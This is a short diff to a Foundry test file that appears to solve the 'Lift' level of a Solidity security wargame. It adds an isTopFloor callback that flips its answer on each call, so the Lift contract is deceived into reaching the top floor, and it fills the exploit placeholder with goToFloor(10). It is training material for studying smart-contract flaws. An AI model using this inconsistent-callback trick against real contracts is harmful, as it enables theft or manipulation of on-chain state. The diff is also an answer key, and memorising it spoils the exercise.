@@ -5,9 +5,14 @@ import "./BaseTest.t.sol";
 import "src/07_Lift/Lift.sol";
 
 // forge test --match-contract LiftTest
-contract LiftTest is BaseTest {
+contract LiftTest is BaseTest, House {
     Lift instance;
-    bool isTop = true;
+    bool isTop = false;
+
+    function isTopFloor(uint256) external override returns(bool) {
+        isTop = !isTop;
+        return !isTop;
+    }
 
     function setUp() public override {
         super.setUp();
@@ -16,7 +21,7 @@ contract LiftTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        instance.goToFloor(10);
 
         checkSuccess();
     }
